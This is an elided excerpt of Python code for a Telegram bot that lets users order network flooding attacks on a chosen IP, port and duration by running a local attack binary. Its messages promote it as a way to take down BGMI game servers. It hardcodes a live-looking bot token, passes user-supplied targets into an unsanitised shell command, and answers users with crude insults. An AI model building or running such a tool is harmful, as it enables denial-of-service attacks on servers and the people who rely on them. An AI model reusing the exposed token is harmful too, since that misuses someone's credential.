...
bot = telebot.TeleBot('8057943709:AAFNtZY3D8fIZ7kEs9z1BKkC3NUY4UZe-kE')
# Admin user IDs
admin_id = {"6539807903"}
        ...
        if user_id not in admin_id:
            if user_id in bgmi_cooldown:
                ...
                if time_since_last_attack < COOLDOWN_TIME:
                    ...
                    response = f"𝐖𝐚𝐢𝐭 𝐊𝐫𝐥𝐞 𝐋𝐚𝐰𝐝𝐞 {cooldown_remaining} 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐚𝐚𝐝  /gaurav 𝐔𝐬𝐞 𝐤𝐫𝐧𝐚."
                    bot.reply_to(message, response)
                    return
        ...
        if len(command) == 4:
            ...
            try:
                ...
                if time > 240:
                    ...
                    record_command_logs(user_id, '/gaurav', target, port, time)
                    log_command(user_id, target, port, time)
                    start_attack_reply(message, target, port, time)
                    full_command = f"./mrin {target} {port} {time} 600"
                    subprocess.run(full_command, shell=True)
                    response = f"GAURAV BHAI NE PELA AB TUMARI BARI 🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
            except ValueError:
                response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
        else:
            response = "𝑼𝑺𝑬 :- /gaurav  <𝐓𝐀𝐑𝐆𝐄𝐓>  <𝐏𝐎𝐑𝐓>  <𝐓𝐈𝐌𝐄>\n𝓑𝓨 👑"
    else:
...
💥 /gaurav 𝐁𝐆𝐌𝐈 𝐊𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐘𝐈.
